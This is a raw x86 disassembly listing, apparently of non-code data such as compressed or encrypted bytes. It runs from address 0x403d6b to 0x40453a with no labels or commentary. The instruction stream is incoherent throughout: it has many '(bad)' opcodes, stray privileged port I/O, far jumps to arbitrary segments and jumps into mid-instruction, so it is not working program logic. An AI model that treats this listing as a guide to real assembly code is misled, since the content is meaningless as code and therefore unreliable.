  403d6b:	mov    bl,BYTE PTR [ebx]
  403d6d:	loop   0x403dba
  403d6f:	in     eax,dx
  403d70:	div    DWORD PTR [esi-0x20]
  403d73:	and    edi,ebp
  403d75:	inc    esi
  403d76:	jbe    0x403d33
  403d78:	add    eax,0xfe6e2c16
  403d7d:	and    eax,0x3b6dd692
  403d82:	sbb    ebp,ebx
  403d84:	or     ax,WORD PTR [eax]
  403d87:	add    BYTE PTR [eax],al
  403d89:	add    BYTE PTR [eax],al
  403d8b:	popf   
  403d8c:	les    ebp,FWORD PTR [edi+0x5a]
  403d8f:	out    0x74,eax
  403d91:	je     0x403dfd
  403d93:	jns    0x403df0
  403d95:	sar    bh,1
  403d97:	adc    cl,BYTE PTR [esi-0x29b302d]
  403d9d:	retf   0xfe9e
  403da0:	repz leave 
  403da2:	scas   al,BYTE PTR es:[edi]
  403da3:	and    BYTE PTR [edi+ebx*1],0xc2
  403da7:	in     eax,0xb4
  403da9:	and    al,0xf2
  403dab:	pop    ebx
  403dac:	out    0x1d,al
  403dae:	mov    ds:0x93169ae9,eax
  403db3:	outs   dx,DWORD PTR ds:[esi]
  403db4:	add    al,BYTE PTR [ebp-0x6da68f06]
  403dba:	stc    
  403dbb:	test   al,0xe5
  403dbd:	sbb    al,BYTE PTR [ecx]
  403dbf:	sar    BYTE PTR [edi-0x1c],cl
  403dc2:	add    ecx,edx
  403dc4:	adc    DWORD PTR [eax+ebp*2-0x51],ebx
  403dc8:	or     BYTE PTR [ebx-0xdf13095],0x72
  403dcf:	sahf   
  403dd0:	push   esp
  403dd1:	fnsave [ecx+0x5e]
  403dd4:	jmp    0xce44:0x89ebd57a
  403ddb:	repz not esp
  403dde:	(bad)  
  403ddf:	sbb    ch,BYTE PTR [esi-0x1e]
  403de2:	int3   
  403de3:	inc    edx
  403de4:	in     al,0x6e
  403de6:	aam    0x47
  403de8:	iret   
  403de9:	cmp    bh,cl
  403deb:	pop    ss
  403dec:	inc    ecx
  403ded:	rol    esi,0x0
  403df0:	add    BYTE PTR [eax],al
  403df2:	add    BYTE PTR [eax],al
  403df4:	(bad)  
  403df5:	stos   BYTE PTR es:[edi],al
  403df6:	into   
  403df7:	int    0xf6
  403df9:	adc    al,0x68
  403dfb:	imul   esp,DWORD PTR [ebx-0x49],0x499b6a17
  403e02:	xchg   BYTE PTR [ebx+0x62],dh
  403e05:	mov    ds:0x2d3a70f1,eax
  403e0a:	jno    0x403e07
  403e0c:	cmp    al,0x9c
  403e0e:	(bad)  
  403e0f:	neg    DWORD PTR [edx+esi*1-0x71]
  403e13:	add    DWORD PTR [esi+0x6e02d8b8],ecx
  403e19:	inc    esi
  403e1a:	jbe    0x403e3d
  403e1c:	(bad)  [ebp+0x1be322e1]
  403e22:	dec    eax
  403e23:	sbb    ebp,DWORD PTR [edx-0x4de8082f]
  403e29:	aas    
  403e2a:	mov    edx,edi
  403e2c:	xchg   esp,eax
  403e2d:	sub    dl,BYTE PTR [esi+0x94a4f9]
  403e33:	daa    
  403e34:	jne    0x403db7
  403e36:	push   esp
  403e37:	lock ja 0x403eab
  403e3a:	ret    0x5a4e
  403e3d:	fsub   QWORD PTR [eax-0x47]
  403e40:	cdq    
  403e41:	or     al,0xf7
  403e43:	and    BYTE PTR [eax-0x7730b2c3],cl
  403e49:	sub    eax,0x184057db
  403e4e:	dec    edx
  403e4f:	mov    al,ds:0x29dc4843
  403e54:	xor    bh,cl
  403e56:	gs mov dh,0x0
  403e59:	add    BYTE PTR [eax],al
  403e5b:	add    BYTE PTR [eax],al
  403e5d:	cs jmp 0x550dcf52
  403e63:	push   ebx
  403e64:	aas    
  403e65:	sahf   
  403e66:	test   ch,al
  403e68:	scas   al,BYTE PTR es:[edi]
  403e69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e6a:	mov    ch,0x7f
  403e6c:	sbb    DWORD PTR [ebp+eiz*4-0x4f737b17],esp
  403e73:	sbb    al,0x33
  403e75:	lahf   
  403e76:	ror    BYTE PTR [edx+0x3091879a],0x5
  403e7d:	test   DWORD PTR [ecx-0x5a],esp
  403e80:	arpl   WORD PTR [ecx],sp
  403e82:	in     al,dx
  403e83:	add    al,0x2c
  403e85:	ret    0x92fb
  403e88:	mov    ebp,0xca294cb0
  403e8d:	mov    cl,0x1c
  403e8f:	mov    edi,0x2e287b3a
  403e94:	and    eax,0x94b83898
  403e99:	outs   dx,BYTE PTR ds:[esi]
  403e9a:	or     DWORD PTR [edx],eax
  403e9c:	ret    
  403e9d:	imul   ebx,ecx,0xffffff93
  403ea0:	popf   
  403ea1:	mov    edi,0xaaaa3766
  403ea6:	jbe    0x403e49
  403ea8:	xor    esi,DWORD PTR [ebp+eax*8+0x1b]
  403eac:	cld    
  403ead:	je     0x403e44
  403eaf:	lea    eax,[eax]
  403eb1:	mov    WORD PTR [eax],es
  403eb3:	add    BYTE PTR [eax],al
  403eb5:	xchg   ebp,eax
  403eb6:	div    DWORD PTR [eax]
  403eb8:	inc    ecx
  403eb9:	mov    ss,WORD PTR [esi-0x34887d9f]
  403ebf:	push   edx
  403ec0:	ret    
  403ec1:	add    BYTE PTR [eax],al
  403ec3:	add    BYTE PTR [eax],al
  403ec5:	add    BYTE PTR [eax+0xa],ch
  403ec8:	lds    eax,FWORD PTR [ecx+edx*4]
  403ecb:	shl    ebx,cl
  403ecd:	inc    ebp
  403ece:	stos   BYTE PTR es:[edi],al
  403ecf:	cmp    BYTE PTR [edi-0x69c27c7a],ah
  403ed5:	(bad)  
  403ed6:	and    al,0xb7
  403ed8:	mov    cl,BYTE PTR [eax]
  403eda:	in     eax,dx
  403edb:	sar    DWORD PTR [ebx-0x177339b7],0x8a
  403ee2:	out    dx,eax
  403ee3:	push   ebx
  403ee4:	fxch   st(3)
  403ee6:	loopne 0x403f1a
  403ee8:	dec    edi
  403ee9:	or     al,0x9
  403eeb:	dec    esi
  403eec:	jle    0x403f3b
  403eee:	mov    ds:0x9b8e2d80,al
  403ef3:	ja     0x403f11
  403ef5:	iret   
  403ef6:	out    0xc1,al
  403ef8:	adc    dl,BYTE PTR [ecx-0x11]
  403efb:	mov    dh,0x23
  403efd:	adc    ah,al
  403eff:	push   ebx
  403f00:	jo     0x403ed5
  403f02:	sub    eax,0x2292418d
  403f07:	dec    esi
  403f08:	xlat   BYTE PTR ds:[ebx]
  403f09:	push   ebp
  403f0a:	retf   
  403f0b:	xor    ah,dh
  403f0d:	adc    al,0xe0
  403f0f:	ja     0x403ec6
  403f11:	xlat   BYTE PTR ds:[ebx]
  403f12:	fld    DWORD PTR [eax-0x7b1697c]
  403f18:	xchg   edi,eax
  403f19:	pop    ecx
  403f1a:	push   edi
  403f1b:	jmp    FWORD PTR [eax-0x63573e8]
  403f21:	(bad)  ds:0xaa9aca95
  403f27:	aad    0x5c
  403f29:	pop    ebp
  403f2a:	add    BYTE PTR [eax],al
  403f2c:	add    BYTE PTR [eax],al
  403f2e:	add    bl,dl
  403f30:	or     ch,BYTE PTR [esp+ebx*1+0x75]
  403f34:	gs inc ebx
  403f36:	aas    
  403f37:	ret    0x4a86
  403f3a:	push   cs
  403f3b:	sti    
  403f3c:	inc    esi
  403f3d:	and    BYTE PTR [edi+edx*8],0x15
  403f41:	test   DWORD PTR ds:0x46727496,edx
  403f47:	push   ebp
  403f48:	adc    ebx,DWORD PTR [ebx+0x77]
  403f4b:	adc    al,0x8a
  403f4d:	pushf  
  403f4e:	loope  0x403f6b
  403f50:	xchg   ecx,eax
  403f51:	mov    cl,0xd0
  403f53:	push   edx
  403f54:	pop    eax
  403f55:	mov    BYTE PTR [ebx-0x4d409067],0xd0
  403f5c:	fiadd  WORD PTR [esi-0x52]
  403f5f:	pop    ds
  403f60:	fnstsw WORD PTR ds:0x18fc5e9f
  403f66:	int3   
  403f67:	lea    ebp,[ebx-0x1d3302cd]
  403f6d:	repnz push 0xffffffe3
  403f70:	clc    
  403f71:	fstp   DWORD PTR [ecx+0x1a]
  403f74:	mov    al,ds:0xa75108fc
  403f79:	pop    es
  403f7a:	cmp    BYTE PTR [eax+0x6363ddc],cl
  403f80:	fild   DWORD PTR [esi+0x7]
  403f83:	(bad)  
  403f84:	cmp    eax,0xed845434
  403f89:	sbb    BYTE PTR [ebp+0x45],ah
  403f8c:	and    dl,bl
  403f8e:	repnz jmp 0x0:0xc1f336
  403f96:	add    BYTE PTR [eax],al
  403f98:	and    esp,DWORD PTR [edx]
  403f9a:	or     BYTE PTR [ecx-0x6002d698],dl
  403fa0:	mov    eax,ds:0xcebc84c4
  403fa5:	xchg   edx,eax
  403fa6:	jg     0x403f35
  403fa8:	movzx  ebx,BYTE PTR [edx-0x22]
  403fac:	cmp    al,0x55
  403fae:	jno    0x403f9f
  403fb0:	jge    0x403fb4
  403fb2:	pop    edx
  403fb3:	mov    cl,0x2c
  403fb5:	mov    ds:0x643d9c53,eax
  403fba:	sub    BYTE PTR [edi-0x39ceda82],bh
  403fc0:	dec    edi
  403fc1:	out    0xb8,al
  403fc3:	sub    al,BYTE PTR [edx-0x3]
  403fc6:	iret   
  403fc7:	and    DWORD PTR [ebx],ecx
  403fc9:	ds stos DWORD PTR es:[edi],eax
  403fcb:	xor    al,0x50
  403fcd:	jnp    0x403f61
  403fcf:	dec    edi
  403fd0:	pop    ecx
  403fd1:	mov    esp,0x3ff0e7d
  403fd6:	ins    BYTE PTR es:[edi],dx
  403fd7:	cmc    
  403fd8:	das    
  403fd9:	inc    ebx
  403fda:	dec    edi
  403fdb:	loopne 0x404037
  403fdd:	xchg   BYTE PTR [esi-0x15],cl
  403fe0:	cmp    eax,0x3863c1c5
  403fe5:	adc    al,cl
  403fe7:	push   0x8de34f41
  403fec:	sbb    dl,BYTE PTR [edx-0x2f1c8926]
  403ff2:	lds    esi,FWORD PTR [edi-0x335bf48b]
  403ff8:	fs dec edx
  403ffa:	(bad)  
  403ffb:	test   eax,0x0
  404000:	add    BYTE PTR [edi-0x395d2973],dl
  404006:	int3   
  404007:	sub    DWORD PTR [eax-0x50],0x36
  40400b:	mov    ah,BYTE PTR [ebx-0x67]
  40400e:	mul    DWORD PTR [eax+0x76]
  404011:	inc    edx
  404012:	mov    eax,0x796b8d58
  404017:	inc    edi
  404018:	int3   
  404019:	or     eax,0x1cb72633
  40401e:	hlt    
  40401f:	add    al,0xa2
  404021:	fbstp  TBYTE PTR [esp+edx*1+0x7b75aea9]
  404028:	and    DWORD PTR [edx-0x2cd56dc2],ebp
  40402e:	(bad)  
  40402f:	jmp    FWORD PTR [eax-0x6f21a8ce]
  404035:	add    DWORD PTR [esi-0xb7b0061],0xe4adee57
  40403f:	sbb    BYTE PTR ds:0xcda31c1,cl
  404045:	xchg   edx,eax
  404046:	inc    edx
  404047:	fwait
  404048:	dec    esp
  404049:	aam    0x2d
  40404b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40404c:	cmp    eax,0x1ee63cdf
  404051:	mov    dl,0xb
  404053:	and    eax,0x63dac11f
  404058:	call   0x1e3b146
  40405d:	sti    
  40405e:	and    dl,0xda
  404061:	iret   
  404062:	into   
  404063:	and    ebx,eax
  404065:	add    BYTE PTR [eax],al
  404067:	add    BYTE PTR [eax],al
  404069:	add    BYTE PTR [edx+0x5d54609f],bh
  40406f:	mov    ds:0xd15635af,al
  404074:	out    dx,al
  404075:	push   esi
  404076:	dec    ebx
  404077:	test   BYTE PTR ds:0x6c546867,ch
  40407d:	xor    cl,al
  40407f:	out    0xaa,al
  404081:	cmp    DWORD PTR [edx-0x9],esp
  404084:	jmp    0x298897db
  404089:	dec    ebx
  40408a:	dec    esp
  40408b:	sbb    DWORD PTR [eax+0x16],ebp
  40408e:	push   ss
  40408f:	sbb    dh,dh
  404091:	not    DWORD PTR [edx]
  404093:	dec    ecx
  404094:	mov    bh,0xd4
  404096:	jno    0x404095
  404098:	jae    0x40407f
  40409a:	add    bl,ch
  40409c:	xor    al,0xb2
  40409e:	stos   DWORD PTR es:[edi],eax
  40409f:	pop    esi
  4040a0:	repnz mov ebx,0x90b38f3e
  4040a6:	(bad)  
  4040a7:	shl    BYTE PTR [eax-0x77],0x94
  4040ab:	mov    cl,0x31
  4040ad:	add    BYTE PTR [ebx-0x35010c94],al
  4040b3:	popa   
  4040b4:	ret    0x61bf
  4040b7:	push   esi
  4040b8:	xchg   ecx,eax
  4040b9:	jl     0x404113
  4040bb:	shl    DWORD PTR [eax+0x368f1f3d],1
  4040c1:	cli    
  4040c2:	not    BYTE PTR ds:0x40fdbb07
  4040c8:	push   esp
  4040c9:	js     0x4040bf
  4040cb:	sub    esp,DWORD PTR [ebp+0x39]
  4040ce:	add    BYTE PTR [eax],al
  4040d0:	add    BYTE PTR [eax],al
  4040d2:	add    BYTE PTR [edi-0x77],dh
  4040d5:	cwde   
  4040d6:	dec    ebx
  4040d7:	jle    0x4040f7
  4040d9:	test   eax,0xfa39950a
  4040de:	leave  
  4040df:	pushf  
  4040e0:	adc    cl,bl
  4040e2:	mov    BYTE PTR [ebx-0x6db0a2ad],bh
  4040e8:	jp     0x404156
  4040ea:	push   cs
  4040eb:	jns    0x40414a
  4040ed:	aas    
  4040ee:	int    0x80
  4040f0:	enter  0x8c0e,0xcf
  4040f4:	fst    QWORD PTR [ecx]
  4040f6:	inc    ebx
  4040f7:	out    0x46,al
  4040f9:	and    eax,DWORD PTR [edx]
  4040fb:	or     eax,0xe4c16ff0
  404100:	cld    
  404101:	inc    eax
  404102:	xor    BYTE PTR [ebx-0x65b82947],0x92
  404109:	in     eax,0x6
  40410b:	icebp  
  40410c:	add    esi,DWORD PTR [ebp-0x7c5f173b]
  404112:	test   ch,cl
  404114:	inc    esi
  404115:	mov    bl,BYTE PTR [edx]
  404117:	and    al,0xde
  404119:	mov    edx,0xe7fccf5b
  40411e:	cwde   
  40411f:	out    0xef,al
  404121:	fcomp  st(1)
  404123:	icebp  
  404124:	xchg   edx,eax
  404125:	dec    esi
  404126:	push   ds
  404127:	fdivr  DWORD PTR [ecx-0x2f8aa083]
  40412d:	(bad)  
  40412e:	sub    al,0xf9
  404130:	iret   
  404131:	add    ebx,DWORD PTR [eax+esi*4]
  404134:	inc    edx
  404135:	jnp    0x404137
  404137:	add    BYTE PTR [eax],al
  404139:	add    BYTE PTR [eax],al
  40413b:	add    BYTE PTR [edi+0x49],ah
  40413e:	xchg   BYTE PTR [ecx],dh
  404140:	es and al,0x71
  404143:	(bad)  
  404144:	in     eax,0x3b
  404146:	pop    eax
  404147:	push   ebx
  404148:	(bad)  
  404149:	(bad)  
  40414a:	cwde   
  40414b:	lds    eax,FWORD PTR [ebx+0x4af4b165]
  404151:	enter  0xa7c6,0x1
  404155:	mov    eax,0x77a896bb
  40415a:	or     DWORD PTR [esp+ebx*4-0x3272ffe8],edi
  404161:	xor    eax,0x260eddd3
  404166:	out    dx,al
  404167:	out    dx,al
  404168:	lahf   
  404169:	push   ebx
  40416a:	sub    eax,0x145c5879
  40416f:	dec    eax
  404170:	adc    DWORD PTR [ecx+0x3f],esi
  404173:	sbb    ecx,edx
  404175:	mov    cl,BYTE PTR [edx+0x2a]
  404178:	mov    ds:0x5436c20f,eax
  40417d:	mov    al,ds:0xfd1507c6
  404182:	stos   DWORD PTR es:[edi],eax
  404183:	push   esp
  404184:	(bad)  
  404185:	(bad)  
  404186:	xchg   esp,eax
  404187:	gs push edi
  404189:	stos   DWORD PTR es:[edi],eax
  40418a:	push   ebp
  40418b:	repz adc BYTE PTR [ebx+ebp*2],al
  40418f:	ret    0xf8d9
  404192:	xchg   DWORD PTR [ecx-0x5f7efd6e],edx
  404198:	pop    ebx
  404199:	dec    ebp
  40419a:	(bad)  
  40419b:	scas   al,BYTE PTR es:[edi]
  40419c:	int    0xdd
  40419e:	rcr    DWORD PTR [edi+0x0],0x0
  4041a5:	cld    
  4041a6:	(bad)  
  4041a7:	xchg   esp,eax
  4041a8:	int3   
  4041a9:	aas    
  4041aa:	add    BYTE PTR [ebp+edi*8+0x6b69026e],ch
  4041b1:	pop    esi
  4041b2:	pop    esi
  4041b3:	adc    BYTE PTR [esi+0x3f],0x9d
  4041b7:	pop    ebx
  4041b8:	sub    DWORD PTR [eax+eiz*8+0x41],0xd51f8d88
  4041c0:	call   DWORD PTR [esi+0x6808b452]
  4041c6:	xchg   ecx,eax
  4041c7:	xlat   BYTE PTR ds:[ebx]
  4041c8:	in     eax,dx
  4041c9:	xor    ah,dl
  4041cb:	in     eax,0xd2
  4041cd:	sub    edx,DWORD PTR [ebx]
  4041cf:	xor    DWORD PTR [esp+edx*4],edx
  4041d2:	push   ebp
  4041d3:	cmp    BYTE PTR ds:0x4a5394c5,ch
  4041d9:	not    bh
  4041db:	dec    ecx
  4041dc:	aas    
  4041dd:	(bad)  
  4041de:	push   ss
  4041df:	mov    dl,0x9d
  4041e1:	mov    ds:0x9ba29b4f,al
  4041e6:	push   cs
  4041e7:	mov    al,0xcf
  4041e9:	ror    ch,0xc9
  4041ec:	mov    eax,0x79568ff9
  4041f1:	xchg   DWORD PTR [eax+0x57],ecx
  4041f4:	mov    ss,WORD PTR [esi-0x1a9c8bf7]
  4041fa:	retf   0x5c65
  4041fd:	mov    ah,0x8b
  4041ff:	jmp    0xcedb:0xe344a9e4
  404206:	add    eax,0xf6b8
  40420b:	add    BYTE PTR [eax],al
  40420d:	add    BYTE PTR [ebx-0x3a],bh
  404210:	rcl    DWORD PTR [ecx],0x83
  404213:	xchg   esi,ecx
  404215:	push   eax
  404216:	or     eax,0xcc37df41
  40421b:	add    DWORD PTR [edx+ebx*1+0x259dc31f],edi
  404222:	test   BYTE PTR ds:[eax-0x25],ch
  404226:	xor    esi,edi
  404228:	pusha  
  404229:	in     al,0x6
  40422b:	cmp    eax,0x65647a00
  404230:	popf   
  404231:	sub    ebx,0x77
  404234:	fmul   QWORD PTR [edx+eiz*4]
  404237:	add    bl,BYTE PTR [ebx]
  404239:	sbb    eax,0x3e59d345
  40423e:	nop
  40423f:	and    BYTE PTR [ecx-0x27ce90e1],bl
  404245:	mov    al,0x17
  404247:	dec    esi
  404248:	pop    ss
  404249:	cdq    
  40424a:	loopne 0x404268
  40424c:	push   esi
  40424d:	jb     0x40424c
  40424f:	out    dx,eax
  404250:	xchg   esp,eax
  404251:	mov    eax,edx
  404253:	(bad)  
  404254:	rcl    DWORD PTR [esp+eax*1],cl
  404257:	mov    DWORD PTR [ebx],edx
  404259:	adc    eax,0xf652592b
  40425e:	aas    
  40425f:	stos   BYTE PTR es:[edi],al
  404260:	xchg   ecx,eax
  404261:	out    0x16,eax
  404263:	mov    ebx,0x916b27d0
  404268:	in     al,dx
  404269:	es dec esp
  40426b:	shr    BYTE PTR [ebp+0x6e732945],0x34
  404272:	add    BYTE PTR [eax],al
  404274:	add    BYTE PTR [eax],al
  404276:	add    BYTE PTR [esi+0x64e32f62],ah
  40427c:	xlat   BYTE PTR ds:[ebx]
  40427d:	out    0xca,eax
  40427f:	jno    0x404286
  404281:	test   eax,0x6a3152e1
  404286:	clc    
  404287:	xor    esp,DWORD PTR [esi]
  404289:	sub    ebx,DWORD PTR [edi-0x2e]
  40428c:	sbb    esp,esp
  40428e:	outs   dx,BYTE PTR ds:[esi]
  40428f:	aad    0x4a
  404291:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404292:	dec    ebp
  404293:	sar    cl,0x65
  404296:	sub    al,0xff
  404298:	out    0x26,eax
  40429a:	pop    ebx
  40429b:	ds pop esi
  40429d:	loopne 0x4042f1
  40429f:	jmp    0xd469e432
  4042a4:	mov    ebx,0xacdb3062
  4042a9:	and    eax,DWORD PTR [eax]
  4042ab:	sub    BYTE PTR ds:0x2411bde1,bh
  4042b1:	sar    ah,1
  4042b3:	push   0xffffff88
  4042b5:	cmp    DWORD PTR [edi],0xffffffe3
  4042b8:	adc    eax,0x510c7eb2
  4042bd:	and    al,0xb9
  4042bf:	add    eax,0xef815c8
  4042c4:	addr16 inc esi
  4042c6:	cmp    eax,DWORD PTR [edi]
  4042c8:	bound  esi,QWORD PTR [edi+0x7a]
  4042cb:	nop
  4042cc:	jmp    0x404338
  4042ce:	mov    ch,0x99
  4042d0:	cld    
  4042d1:	pop    ecx
  4042d2:	hlt    
  4042d3:	jb     0x4042a6
  4042d5:	or     BYTE PTR [edi],dh
  4042d7:	stos   DWORD PTR es:[edi],eax
  4042d8:	dec    eax
  4042d9:	cmp    BYTE PTR [esi+0x0],dh
  4042dc:	add    BYTE PTR [eax],al
  4042de:	add    BYTE PTR [eax],al
  4042e0:	aam    0xd
  4042e2:	scas   al,BYTE PTR es:[edi]
  4042e3:	mov    cl,0xed
  4042e5:	xchg   edx,eax
  4042e6:	sahf   
  4042e7:	lock push ss
  4042e9:	mov    esp,0xa50f33cb
  4042ee:	cld    
  4042ef:	jb     0x40428d
  4042f1:	add    BYTE PTR [eax],al
  4042f3:	add    BYTE PTR [ebp-0x70c8953e],cl
  4042f9:	test   ah,dl
  4042fb:	outs   dx,BYTE PTR ds:[esi]
  4042fc:	pop    esi
  4042fd:	inc    esi
  4042fe:	mov    esi,0xa80f5b59
  404303:	fcomp  QWORD PTR [edx-0x37]
  404306:	ret    0x48eb
  404309:	jae    0x404387
  40430b:	mov    dl,0x59
  40430d:	dec    ebp
  40430e:	push   ss
  40430f:	test   DWORD PTR [edx-0x6f],eax
  404312:	push   eax
  404313:	mov    eax,0x8f3b5753
  404318:	push   ecx
  404319:	adc    eax,0xdb50d685
  40431e:	out    dx,al
  40431f:	loope  0x404346
  404321:	call   0x5393:0x582464f8
  404328:	jne    0x4042c9
  40432a:	jge    0x404359
  40432c:	jg     0x4042ce
  40432e:	aas    
  40432f:	inc    edi
  404330:	dec    eax
  404331:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404332:	in     eax,0xa2
  404334:	test   DWORD PTR [esi-0x4b4d3659],edi
  40433a:	popa   
  40433b:	ja     0x4042d0
  40433d:	retf   
  40433e:	and    ebx,DWORD PTR ds:0xaef009c
  404344:	add    BYTE PTR [eax],al
  404346:	add    BYTE PTR [eax],al
  404348:	add    BYTE PTR [ecx],dl
  40434a:	add    BYTE PTR [ecx+0x6a91fe61],dh
  404350:	fbstp  TBYTE PTR [edi-0x3f4ad36e]
  404356:	mov    bh,0xd8
  404358:	icebp  
  404359:	lods   eax,DWORD PTR ds:[esi]
  40435a:	mov    eax,0xbaba9896
  40435f:	push   esp
  404360:	fstp   TBYTE PTR es:[ecx-0x60fbb3ee]
  404367:	fistp  WORD PTR [ecx-0x77]
  40436a:	xchg   ebp,eax
  40436b:	popf   
  40436c:	xor    BYTE PTR [esi-0x65],dl
  40436f:	pop    ebx
  404370:	mov    cs,WORD PTR [edi]
  404372:	xchg   esp,eax
  404373:	sbb    esp,esp
  404375:	cmp    BYTE PTR [ecx],al
  404377:	dec    edi
  404378:	inc    esi
  404379:	xchg   ebp,eax
  40437a:	add    cl,BYTE PTR [ebp-0x356f5dd4]
  404380:	xchg   edx,eax
  404381:	add    ecx,DWORD PTR [edi-0x5bd307f8]
  404387:	inc    edi
  404388:	out    dx,al
  404389:	mov    eax,ds:0x6e8485bb
  40438e:	mov    ch,0xc3
  404390:	cmp    ah,BYTE PTR [edi-0x2faffe32]
  404396:	pop    ebx
  404397:	cmp    eax,0x7f549d17
  40439c:	jge    0x404368
  40439e:	pop    esi
  40439f:	mov    ecx,0xfb556bc3
  4043a4:	test   al,0x74
  4043a6:	add    bl,BYTE PTR [eax]
  4043a8:	xor    eax,0x771985e2
  4043ad:	add    BYTE PTR [eax],al
  4043af:	add    BYTE PTR [eax],al
  4043b1:	add    BYTE PTR [eax+0x4f],al
  4043b4:	sbb    esi,DWORD PTR [ecx-0xce55762]
  4043ba:	jne    0x404379
  4043bc:	or     eax,0x4721829
  4043c1:	imul   ebp,edx,0x62
  4043c4:	push   cs
  4043c5:	lods   eax,DWORD PTR ds:[esi]
  4043c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043c7:	pushf  
  4043c8:	pop    es
  4043c9:	out    dx,eax
  4043ca:	dec    edi
  4043cb:	leave  
  4043cc:	retf   0x3021
  4043cf:	dec    esi
  4043d0:	retf   
  4043d1:	arpl   WORD PTR [edx-0x135a36e9],dx
  4043d7:	ffreep st(7)
  4043d9:	out    0xc7,eax
  4043db:	hlt    
  4043dc:	rcr    BYTE PTR [ebx],cl
  4043de:	or     edx,ebp
  4043e0:	rcr    DWORD PTR [ecx-0x65],1
  4043e3:	cli    
  4043e4:	mov    edi,0xc144159f
  4043e9:	fnstsw WORD PTR [ecx+edx*1+0x14]
  4043ed:	adc    eax,DWORD PTR [ecx+0x23510d96]
  4043f3:	mov    edi,0x77bd9707
  4043f8:	(bad)  
  4043f9:	aam    0xd4
  4043fb:	ins    BYTE PTR es:[edi],dx
  4043fc:	cmp    DWORD PTR [edx-0x10],edi
  4043ff:	sar    DWORD PTR [eax],0x3c
  404402:	xchg   edx,eax
  404403:	xchg   edx,eax
  404404:	cmp    bh,dh
  404406:	int    0x68
  404408:	cmp    eax,eax
  40440a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40440b:	jnp    0x40442b
  40440d:	jno    0x4043a7
  40440f:	not    BYTE PTR [esi]
  404411:	xor    ebp,DWORD PTR [edx+0xf51ced]
  404417:	add    BYTE PTR [eax],al
  404419:	add    BYTE PTR [eax],al
  40441b:	inc    ebp
  40441c:	adc    eax,0x3feeb714
  404421:	pop    es
  404422:	mov    esp,DWORD PTR [ecx]
  404424:	sbb    edi,esi
  404426:	dec    eax
  404427:	add    ecx,DWORD PTR [edx+0x0]
  40442a:	hlt    
  40442b:	or     DWORD PTR [edx],0x16
  40442e:	in     eax,dx
  40442f:	cmp    DWORD PTR ds:0xef6e021,esp
  404435:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404436:	loope  0x4043ec
  404438:	clc    
  404439:	xchg   edx,eax
  40443a:	sar    DWORD PTR [edx+0x62],cl
  40443d:	retf   0x30d2
  404440:	int    0xfd
  404442:	aad    0xa2
  404444:	call   0x3e9910f8
  404449:	xchg   esi,eax
  40444b:	into   
  40444c:	fidivr WORD PTR [edi-0x6d168cf4]
  404453:	dec    ebx
  404454:	sub    BYTE PTR [ebx+edx*4-0x7f],0xa6
  404459:	pop    ebx
  40445a:	and    DWORD PTR [edi-0x1a7ffdcd],0x518b34da
  404464:	sbb    DWORD PTR [eax],ecx
  404466:	mov    cl,BYTE PTR [ebx-0x6277c111]
  40446c:	ins    BYTE PTR es:[edi],dx
  40446d:	mov    di,bx
  404470:	ret    
  404471:	push   ecx
  404472:	dec    esp
  404473:	pop    ss
  404474:	mov    cl,0xd4
  404476:	inc    ebp
  404477:	push   ebp
  404478:	push   edi
  404479:	jecxz  0x4044ca
  40447b:	fwait
  40447c:	add    al,0xba
  40447e:	inc    esi
  40447f:	add    BYTE PTR [eax],al
  404481:	add    BYTE PTR [eax],al
  404483:	add    cl,dl
  404485:	sub    ecx,DWORD PTR [ebp+0x20cdc631]
  40448b:	xor    BYTE PTR [edx+eiz*2-0x655dde9],al
  404492:	dec    ebp
  404493:	and    esp,eax
  404495:	vmwrite esi,DWORD PTR [esi]
  404498:	pop    ds
  404499:	and    eax,0xa5d2ffc
  40449e:	retf   
  40449f:	and    eax,0x1c925193
  4044a4:	leave  
  4044a5:	mov    bh,0xa5
  4044a7:	add    BYTE PTR [edx-0x6c67653e],dl
  4044ad:	add    al,0xf0
  4044af:	scas   eax,DWORD PTR es:[edi]
  4044b0:	popa   
  4044b1:	ds dec esi
  4044b3:	not    BYTE PTR [eax-0x80]
  4044b6:	and    al,0xc1
  4044b8:	int    0xc9
  4044ba:	xor    al,BYTE PTR [esp+ecx*8+0xb]
  4044be:	pop    eax
  4044bf:	jae    0x40449f
  4044c1:	inc    ebp
  4044c2:	out    0x2a,al
  4044c4:	fild   WORD PTR [edi+0x6de01d8c]
  4044ca:	push   0x1afe150
  4044cf:	addr16 adc esi,edx
  4044d2:	mov    ebx,0xd634023e
  4044d7:	or     DWORD PTR [edi],ebx
  4044d9:	jge    0x40449b
  4044db:	mov    WORD PTR [esi],ds
  4044dd:	mov    bh,0xa9
  4044df:	mov    ebx,0xe213f10c
  4044e4:	or     eax,0xd57e3b
  4044e9:	add    BYTE PTR [eax],al
  4044eb:	add    BYTE PTR [eax],al
  4044ed:	push   ss
  4044ee:	pop    edi
  4044ef:	cmp    eax,ebp
  4044f1:	pop    ss
  4044f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044f3:	push   edx
  4044f4:	fild   WORD PTR ds:0x486ece3
  4044fa:	cmp    DWORD PTR [edi-0x6e96c64f],eax
  404500:	xor    al,0x58
  404502:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404503:	cli    
  404504:	add    ecx,DWORD PTR [edx-0x13]
  404507:	inc    esp
  404508:	pop    edx
  404509:	pop    ebx
  40450a:	sub    ebp,DWORD PTR [edi]
  40450c:	ins    DWORD PTR es:[edi],dx
  40450d:	lods   eax,DWORD PTR ds:[esi]
  40450e:	mov    cl,0x1a
  404510:	sub    BYTE PTR [ebx+esi*2+0x2f3eb771],0xcf
  404518:	out    dx,al
  404519:	aas    
  40451a:	icebp  
  40451b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40451c:	fptan  
  40451e:	scas   eax,DWORD PTR es:[edi]
  40451f:	mov    dl,0x5c
  404521:	repz jns 0x4044fd
  404524:	imul   esi,DWORD PTR [ebp-0x7a],0x5b
  404528:	xchg   DWORD PTR [di+0x1d],edi
  40452c:	or     eax,0x49e17078
  404531:	jge    0x4044ba
  404533:	lahf   
  404534:	and    BYTE PTR [edx-0x3c619a83],al
  40453a:	push   ss
